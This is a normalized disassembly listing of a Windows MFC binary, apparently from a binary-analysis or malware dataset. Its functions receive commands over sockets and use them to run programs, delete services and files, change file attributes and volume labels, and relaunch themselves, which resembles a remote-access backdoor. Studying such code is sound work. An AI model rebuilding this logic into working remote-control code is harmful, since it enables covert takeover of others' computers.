mov ecx [ esi + 0x10 ]
push edi
push eax
push ecx
mov ecx esi
call sub_407060
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
mov [ esp + 0x8 ] 0x0
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push edx
push ecx
call [ SetFileAttributesA@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov [ esp + 0x8 ] 0x1
mov edx [ esi + 0x10 ]
lea ecx [ esp + 0x8 ]
push 0x4
push ecx
push 0x0
push edx
mov ecx esi
call sub_4070f0
push 0x4
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
sub_406680
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40e048
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
mov esi ecx
push edi
push 0xffffffff
push 0x4
lea ecx [ esi + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
push 0x4
push eax
mov eax [ esi + 0x10 ]
push eax
mov ecx esi
call sub_407060
test eax eax
je r-xdata
mov ecx [ esp + 0x34 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x34
retn
mov ecx 0x7
xor eax eax
lea edi [ esp + 0x14 ]
mov ebx [ esi + 0x24 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0xc ]
stosb [ edi ]
call Ordinal_MFC42_540
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x2b ]
push 0x0
push ecx
push 0x64
push 0x64
lea ecx [ esp + 0x28 ]
mov [ esp + 0x58 ] 0x0
call Ordinal_MFC42_2919
push eax
push ebx
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
push 0xffffffff
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_5572
push 0x0
push ecx
lea edx [ esp + 0x14 ]
mov ecx esp
mov [ esp + 0x18 ] esp
push edx
call Ordinal_MFC42_535
lea eax [ esp + 0x1c ]
mov ecx esi
push eax
call sub_403880
push 0x0
push ecx
mov ecx esp
mov [ esp + 0x18 ] esp
push ebx
call Ordinal_MFC42_537
mov ecx esi
call sub_4039b0
push 0x1
push ecx
mov ecx esp
mov [ esp + 0x18 ] esp
push ebx
mov [ esp + 0x2f ] eax
mov [ esp + 0x33 ] edx
call Ordinal_MFC42_537
mov ecx esi
call sub_4039b0
mov [ esp + 0x2b ] eax
mov [ esp + 0x2f ] edx
mov eax [ esi + 0x10 ]
lea edx [ esp + 0x14 ]
push 0x1f
push edx
push 0x0
push eax
mov ecx esi
call sub_4070f0
push 0x1f
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0x3c ] 0xffffffff
call Ordinal_MFC42_800
sub_4067c0
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
push eax
call sub_406ff0
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ecx
retn
push 0xffffffff
push edi
lea ecx [ esi + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x10 ]
push edi
push eax
push ecx
mov ecx esi
call sub_407060
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
mov [ esp + 0x8 ] 0x0
lea ecx [ eax + 0x4 ]
push ecx
push eax
call [ SetVolumeLabelA@IAT ]
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
mov [ esp + 0x8 ] 0x1
mov ecx [ esi + 0x10 ]
lea eax [ esp + 0x8 ]
push 0x4
push eax
push 0x0
push ecx
mov ecx esi
call sub_4070f0
push 0x4
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
sub_406850
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40e078
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
push eax
call sub_406ff0
mov edi eax
test edi edi
je r-xdata
mov ecx [ esp + 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
push 0xffffffff
push edi
lea ecx [ esi + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x10 ]
push edi
push eax
push ecx
mov ecx esi
call sub_407060
test eax eax
je r-xdata
push ebx
push ebp
mov ebp [ esi + 0x24 ]
or ecx 0xffffffff
xor eax eax
lea ebx [ ebp + 0x4 ]
mov edi ebx
[ edi ]
not ecx
dec ecx
xor edi edi
mov [ esp + 0x1c ] edi
lea eax [ ecx + ebp + 0x5 ]
lea ecx [ esp + 0x18 ]
push eax
call Ordinal_MFC42_537
push ebx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2c ] edi
call Ordinal_MFC42_537
push 0x5c
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2c ] 0x1
call Ordinal_MFC42_5683
inc eax
lea edx [ esp + 0x14 ]
push eax
push edx
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_4129
mov eax [ ebp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
push eax
push ecx
push edx
push ebx
push edi
push edi
mov [ esp + 0x40 ] 0x2
call [ ShellExecuteA@IAT ]
pop ebp
cmp eax 0x20
pop ebx
jg r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0xc ] edi
je r-xdata
mov [ esp + 0x14 ] 0x1
mov edx [ esi + 0x10 ]
lea ecx [ esp + 0x14 ]
push 0x4
push ecx
push edi
push edx
mov ecx esi
call sub_4070f0
push 0x4
mov ecx esi
call sub_4071d0
cmp eax edi
je r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0x20 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x8 ]
mov [ esp + 0x20 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] 0xffffffff
call Ordinal_MFC42_800
sub_406990
sub esp 0x260
lea eax [ esp + 0x1c ]
push ebx
push esi
push edi
push 0x104
push eax
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x28 ]
[ edi ]
not ecx
sub edi ecx
push 0xf003f
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
push eax
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x260
retn
push ebp
push 0xf01ff
push rw-data
push edi
call [ OpenServiceA@IAT ]
mov ebx [ Sleep@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov ebp [ QueryServiceStatus@IAT ]
lea eax [ esp + 0x10 ]
push eax
push esi
call ebp
test eax eax
je r-xdata
mov ebp [ CloseServiceHandle@IAT ]
push edi
call ebp
jmp r-xdata
push esi
call [ DeleteService@IAT ]
mov ebp [ CloseServiceHandle@IAT ]
cmp [ esp + 0x14 ] 0x1
je r-xdata
push edi
call ebp
push esi
call ebp
push 0x5dc
call ebx
lea eax [ esp + 0x130 ]
lea ecx [ esp + 0x2c ]
push eax
push ecx
call [ FindFirstFileA@IAT ]
mov esi eax
pop ebp
cmp esi 0xffffffff
je r-xdata
lea edx [ esp + 0x28 ]
push edx
call [ DeleteFileA@IAT ]
push esi
call [ FindClose@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x1
push esi
call [ ControlService@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x14 ] 0x3
jne r-xdata
push 0xa
call ebx
lea edx [ esp + 0x10 ]
push edx
push esi
call ebp
cmp [ esp + 0x14 ] 0x3
je r-xdata
sub_406ab0
push 0xffffffff
push sub_40e0d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
push ebx
push esi
push edi
mov esi ecx
call sub_406990
lea ecx [ esp + 0xc ]
call Ordinal_MFC42_540
xor ebx ebx
push 0x104
push 0x104
lea ecx [ esp + 0x14 ]
mov [ esp + 0x54 ] ebx
call Ordinal_MFC42_2919
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
push 0xffffffff
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_5572
push 0x5c
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_5683
mov edi eax
mov eax [ esp + 0xc ]
lea ecx [ esp + 0x18 ]
mov eax [ eax - 0x8 ]
sub eax edi
dec eax
push eax
push ecx
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_5710
inc edi
lea ecx [ esp + 0xc ]
push edi
mov [ esp + 0x50 ] 0x1
call Ordinal_MFC42_2919
lea edx [ esp + 0xc ]
push rw-data
lea eax [ esp + 0x18 ]
push edx
push eax
call Ordinal_MFC42_924
mov ecx [ esp + 0x14 ]
push 0x1041
push ecx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x54 ] 0x2
call Ordinal_MFC42_353
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x24 ]
push edx
push rw-data
push eax
mov [ esp + 0x58 ] 0x3
call Ordinal_MFC42_926
push rw-data
lea ecx [ esp + 0x24 ]
push eax
push ecx
mov [ esp + 0x58 ] 0x4
call Ordinal_MFC42_924
lea edx [ esp + 0x18 ]
mov [ esp + 0x4c ] 0x5
push edx
push eax
lea eax [ esp + 0x24 ]
push eax
call Ordinal_MFC42_922
push rw-data
lea ecx [ esp + 0x14 ]
push eax
mov [ esp + 0x54 ] 0x6
push ecx
call Ordinal_MFC42_924
lea ecx [ esp + 0x1c ]
mov [ esp + 0x4c ] 0xa
call Ordinal_MFC42_800
lea ecx [ esp + 0x20 ]
mov [ esp + 0x4c ] 0x9
call Ordinal_MFC42_800
lea ecx [ esp + 0x24 ]
mov [ esp + 0x4c ] 0x8
call Ordinal_MFC42_800
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x10 ]
mov eax [ edx - 0x8 ]
push eax
push eax
call Ordinal_MFC42_2919
push eax
lea ecx [ esp + 0x3c ]
call Ordinal_MFC42_6385
lea ecx [ esp + 0x34 ]
call Ordinal_MFC42_1979
mov eax [ esi + 0x4 ]
push ecx
mov edi esp
mov [ esp + 0x30 ] esp
push ecx
add eax 0x38
mov ecx esp
mov [ esp + 0x38 ] esp
push eax
call Ordinal_MFC42_535
push edi
call sub_40abd0
add esp 0x4
mov [ esp + 0x54 ] 0xb
mov edi esp
mov [ esp + 0x38 ] esp
push ecx
mov ecx esp
mov [ esp + 0x3c ] esp
push rw-data
call Ordinal_MFC42_537
push edi
call sub_40abd0
add esp 0x8
mov ecx esi
mov [ esp + 0x54 ] 0x8
push 0x80000002
call sub_403dd0
mov ecx [ esi + 0x4 ]
mov [ esp + 0x28 ] ebx
cmp [ ecx + 0xc ] ebx
je r-xdata
mov eax [ esi + 0x10 ]
lea edx [ esp + 0x28 ]
push 0x4
push edx
push ebx
push eax
mov ecx esi
call sub_4070f0
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x14 ]
push ebx
push ecx
push ebx
push edx
push ebx
push ebx
call [ ShellExecuteA@IAT ]
call Ordinal_MFC42_1175
cmp eax ebx
je r-xdata
push 0x4
mov ecx esi
call sub_4071d0
cmp eax ebx
je r-xdata
xor eax eax
mov edx [ eax ]
mov ecx eax
call [ edx + 0x7c ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x4c ] 0x3
call Ordinal_MFC42_800
lea ecx [ esp + 0x34 ]
mov [ esp + 0x4c ] 0x2
call Ordinal_MFC42_665
lea ecx [ esp + 0x14 ]
mov [ esp + 0x4c ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x18 ]
mov [ esp + 0x4c ] bl
call Ordinal_MFC42_800
lea ecx [ esp + 0xc ]
mov [ esp + 0x4c ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x44 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x44
retn
mov eax [ eax + 0x20 ]
push ebx
push ebx
push 0x10
push eax
call [ PostMessageA@IAT ]
sub_406d30
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40e108
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebp
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
push eax
call sub_406ff0
mov ebp eax
test ebp ebp
je r-xdata
mov ecx [ esp + 0x1c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebp
add esp 0x1c
retn
lea edi [ esi + 0x20 ]
push 0xffffffff
push ebp
mov ecx edi
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x10 ]
push ebp
push eax
push ecx
mov ecx esi
call sub_407060
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
lea ecx [ esp + 0xc ]
mov ebp [ eax ]
add eax 0x4
push eax
call Ordinal_MFC42_537
mov edx [ esp + 0xc ]
mov ecx [ esi + 0x24 ]
mov [ esp + 0x24 ] 0x0
mov eax [ edx - 0x8 ]
lea edx [ ecx + eax + 0x5 ]
lea ecx [ esp + 0x10 ]
push edx
call Ordinal_MFC42_537
push 0xffffffff
push 0x0
mov ecx edi
mov [ esp + 0x2c ] 0x1
call Ordinal_MFC42_6139
push edi
push ebp
push ecx
lea eax [ esp + 0x1c ]
mov ecx esp
mov [ esp + 0x20 ] esp
push eax
call Ordinal_MFC42_535
push ecx
lea edx [ esp + 0x1c ]
mov ecx esp
mov [ esp + 0x28 ] esp
push edx
mov [ esp + 0x38 ] 0x2
call Ordinal_MFC42_535
mov ecx esi
mov [ esp + 0x34 ] 0x1
call sub_403e60
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
push 0xffffffff
push 0x4
mov ecx edi
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x24 ]
push eax
push ecx
mov ecx [ esi + 0x10 ]
push 0x1
push ecx
mov ecx esi
call sub_4070f0
mov eax [ esi + 0x28 ]
mov ecx esi
add eax 0x4
push eax
call sub_4071d0
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x24 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0xc ]
mov [ esp + 0x24 ] 0xffffffff
call Ordinal_MFC42_800
sub_406e80
sub esp 0x18c
push esi
mov esi ecx
push edi
mov ecx 0x61
xor eax eax
lea edi [ esp + 0xc ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ esi + 0x4 ]
push 0x0
push ecx
add eax 0x40
mov ecx esp
mov [ esp + 0x10 ] esp
push eax
call Ordinal_MFC42_535
lea ecx [ esp + 0x140 ]
push ecx
mov ecx esi
call sub_403880
mov edx [ esi + 0x4 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
lea eax [ esp + 0x138 ]
push 0x19
push eax
push 0x0
push ecx
mov ecx esi
call sub_4070f0
push 0x19
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x18c
retn
sub_406f00
call Ordinal_MFC42_1175
test eax eax
je r-xdata
xor eax eax
mov edx [ eax ]
mov ecx eax
call [ edx + 0x7c ]
jmp r-xdata
mov eax [ eax + 0x20 ]
push eax
call sub_40b8e0
add esp 0x4
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push sub_40ad10
call Ordinal_MFC42_1105
retn
sub_406f40
sub esp 0x128
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
push eax
call sub_406ff0
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
add esp 0x128
retn
push 0xffffffff
push edi
lea ecx [ esi + 0x20 ]
call Ordinal_MFC42_6139
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x10 ]
push edi
push eax
push ecx
mov ecx esi
call sub_407060
test eax eax
je r-xdata
mov edi [ esi + 0x24 ]
lea edx [ esp + 0x18 ]
push edx
push edi
call Ordinal_MFC42_3790
push ecx
mov ecx esp
mov [ esp + 0x18 ] esp
push edi
call Ordinal_MFC42_537
mov ecx esi
call sub_4040c0
mov ecx [ esp + 0x24 ]
mov edx [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] ecx
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
lea eax [ esp + 0x8 ]
push 0xc
push eax
push 0x0
push ecx
mov ecx esi
call sub_4070f0
push 0xc
mov ecx esi
call sub_4071d0
test eax eax
je r-xdata
sub_406ff0
mov eax [ ecx + 0x4 ]
push ebx
push ebp
push esi
mov edx [ eax + 0xc ]
push edi
test edx edx
je r-xdata
mov esi [ esp + 0x14 ]
mov edi [ recv@IAT ]
mov ebx [ WSAGetLastError@IAT ]
mov ebp [ Sleep@IAT ]
lea edx [ esp + 0x14 ]
push 0x4
push edx
call sub_407470
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
call ebx
cmp eax 0x2733
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x4
push 0x32
call ebp
jmp r-xdata
push 0x0
lea eax [ esp + 0x18 ]
push 0x4
push eax
push esi
call edi
cmp eax 0xffffffff
jne r-xdata
sub_407060
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
xor edi edi
test esi esi
mov ebp ecx
jbe r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0xc
mov ebx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push 0x0
lea edx [ edi + ebx ]
push esi
push edx
push eax
call [ recv@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea ecx [ edi + ebx ]
push esi
push ecx
mov ecx ebp
call sub_407470
cmp eax 0xffffffff
je r-xdata
add edi eax
sub esi eax
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
mov eax [ ebp + 0x4 ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0xc
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
test esi esi
ja r-xdata
sub_4070f0
push ecx
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
sub eax 0x0
push edi
mov [ esp + 0x10 ] ecx
je r-xdata
mov ebp [ esp + 0x24 ]
mov ebx [ esp + 0x20 ]
jmp r-xdata
dec eax
jne r-xdata
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0xc ]
test eax eax
je r-xdata
mov ebp [ esp + 0x1c ]
mov ebx [ esp + 0x1c ]
mov esi [ esp + 0x24 ]
lea ebp [ esi + 0x4 ]
push ebp
call Ordinal_MFC42_823
mov ebx eax
mov ecx esi
mov eax ecx
add esp 0x4
mov [ ebx ] esi
mov esi [ esp + 0x20 ]
lea edi [ ebx + 0x4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
jmp r-xdata
mov esi [ esp + 0x18 ]
mov edi [ send@IAT ]
push ebp
push ebx
call sub_407300
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
push ebx
call Ordinal_MFC42_825
add esp 0x4
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0x10
push ebx
call Ordinal_MFC42_825
add esp 0x4
push 0x0
push ebp
push ebx
push esi
call edi
cmp eax 0xffffffff
jne r-xdata
sub_4071d0
push ebp
mov ebp esp
push 0xffffffff
push sub_40e13a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] esi
call sub_403350
lea eax [ esi + 0x8 ]
lea ecx [ ebp - 0x14 ]
push eax
call Ordinal_MFC42_535
mov di [ esi + 0xc ]
xor ebx ebx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] ebx
call Ordinal_MFC42_268
push 0x14
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_823
mov ecx eax
add esp 0x4
mov [ ebp - 0x1c ] ecx
cmp ecx ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
xor ecx ecx
push 0x4000000
push ebx
push ebx
push ebx
push 0x1
push rw-data
call Ordinal_MFC42_389
mov ecx eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
push ebx
push ebx
push edi
push edx
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x14 ] ecx
call Ordinal_MFC42_3229
push 0xa4400000
push ebx
push ebx
push 0x1
push ebx
push rw-data
push ebx
mov ecx eax
mov [ esi + 0x18 ] eax
call Ordinal_MFC42_5204
mov ecx [ ebp + 0x8 ]
push 0x1
push 0x8
push ecx
mov ecx eax
mov [ esi + 0x1c ] eax
call Ordinal_MFC42_6881
mov [ ebp - 0x4 ] ebx
call Ordinal_MFC42_1567
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_800
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4072cf
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_1567
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_407300
push ebp
mov ebp esp
push 0xffffffff
push sub_40e158
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
call Ordinal_MFC42_268
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x1c ]
push edx
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x0
push edx
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x40 ]
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1567
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4073b0
push ebp
mov ebp esp
push 0xffffffff
push sub_40e178
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] esi
call Ordinal_MFC42_268
mov ecx [ esi + 0x1c ]
xor edi edi
push 0x1
push edi
mov [ ebp - 0x4 ] edi
push edi
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_6657
mov ecx [ esi + 0x1c ]
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] edi
call Ordinal_MFC42_5356
cmp eax edi
je r-xdata
mov ecx esi
call sub_403350
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1567
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x14 ] 0xc8
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1567
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_407470
push ebp
mov ebp esp
push 0xffffffff
push sub_40e198
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
call Ordinal_MFC42_268
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x1c ]
push edx
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x0
push edx
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x3c ]
mov edi eax
test edi edi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1567
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx esi
call sub_403350
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1567
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_407520
push 0x98
call [ malloc@IAT ]
mov ecx [ esp + 0x8 ]
add esp 0x4
test eax eax
mov [ ecx + 0x94 ] eax
je r-xdata
xor eax eax
retn
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x1c ]
mov [ eax + 0x14 ] ecx
mov ecx [ esp + 0x24 ]
mov [ eax ] edx
mov edx [ esp + 0x10 ]
mov [ eax + 0x1c ] ecx
mov ecx [ esp + 0x2c ]
push esi
mov [ eax + 0x8 ] edx
mov edx [ esp + 0x1c ]
push edi
mov [ eax + 0x24 ] ecx
lea edi [ eax + 0x2c ]
mov ecx 0x6
lea esi [ esp + 0x3c ]
mov [ eax + 0x10 ] edx
mov edx [ esp + 0x28 ]
[ edi ] [ esi ]
mov [ eax + 0x18 ] edx
mov edx [ esp + 0x30 ]
lea edi [ eax + 0x44 ]
mov ecx 0xa
lea esi [ esp + 0x54 ]
mov [ eax + 0x20 ] edx
mov edx [ esp + 0x38 ]
mov [ eax + 0x94 ] 0x0
[ edi ] [ esi ]
mov ecx [ esp + 0x7c ]
mov [ eax + 0x28 ] edx
mov edx [ esp + 0x80 ]
mov [ eax + 0x6c ] ecx
mov ecx [ esp + 0x84 ]
mov [ eax + 0x70 ] edx
mov edx [ esp + 0x88 ]
mov [ eax + 0x74 ] ecx
mov ecx [ esp + 0x8c ]
mov [ eax + 0x78 ] edx
mov edx [ esp + 0x94 ]
mov [ eax + 0x7c ] ecx
mov ecx [ esp + 0x98 ]
mov [ eax + 0x84 ] edx
mov edx [ esp + 0x9c ]
mov [ eax + 0x88 ] ecx
mov ecx [ esp + 0xa0 ]
pop edi
mov [ eax + 0x8c ] edx
mov [ eax + 0x90 ] ecx
pop esi
retn
sub_407620
push esi
push edi
mov edi [ esp + 0xc ]
mov esi [ edi + 0x94 ]
test esi esi
je r-xdata
pop edi
pop esi
retn
push ebx
mov ebx [ free@IAT ]
push ebp
mov ebp [ DeleteDC@IAT ]
push esi
call ebx
mov esi [ edi + 0x94 ]
add esp 0x4
test esi esi
jne r-xdata
mov eax [ esi + 0x88 ]
push eax
call ebx
mov ecx [ esi + 0x78 ]
push ecx
call ebx
mov edx [ esi + 0x80 ]
push edx
call ebx
add esp 0xc
mov eax [ esi + 0x94 ]
mov [ edi + 0x94 ] eax
mov ecx [ esi + 0x70 ]
push ecx
call ebp
mov edx [ esi + 0x74 ]
push edx
call [ DeleteObject@IAT ]
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
pop ebp
pop ebx
sub_4076a0
push edi
mov edi rw-data
mov ecx 0x100
mov [ edi ] 0x0
add edi 0x4
dec ecx
jne r-xdata
mov edi rw-data
mov eax 0x0
mov ecx 0xff
mov [ edi + eax ] 0x2
add eax 0x3
dec ecx
jne r-xdata
pop edi
retn
sub_4076e0
push esi
push edi
mov esi rw-data
mov edi rw-data
mov ecx 0x100
dec ecx
jne r-xdata
mov eax 0x100
sub eax ecx
stosd [ edi ]
lodsd [ esi ]
cmp eax 0x0
je r-xdata
mov esi rw-data
mov ecx 0x100
mov edi rw-data
dec ecx
jne r-xdata
stosd [ edi ]
lodsd [ esi ]
cmp eax 0x0
je r-xdata
mov esi rw-data
sub edi esi
mov ecx edi
shr ecx 0x2
cmp ecx 0x1
jne r-xdata
mov [ rw-data ] ecx
mov [ rw-data ] ecx
pop edi
pop esi
retn
mov edi rw-data
mov eax 0x100
mov [ edi + ecx * 4 ] eax
mov edi rw-data
mov [ edi + ecx * 4 ] 0x1
inc ecx
sub_407760
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
mov [ ebp - 0x4 ] 0xfffffffd
cmp eax 0x1
mov [ ebp - 0x8 ] 0x3e8
jle r-xdata
mov ecx [ ebp - 0x4 ]
mov [ rw-data ] ecx
add ecx 0x3
mov [ rw-data ] cx
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
dec eax
push eax
push 0x0
push rw-data
push rw-data
call sub_407820
add esp 0x10
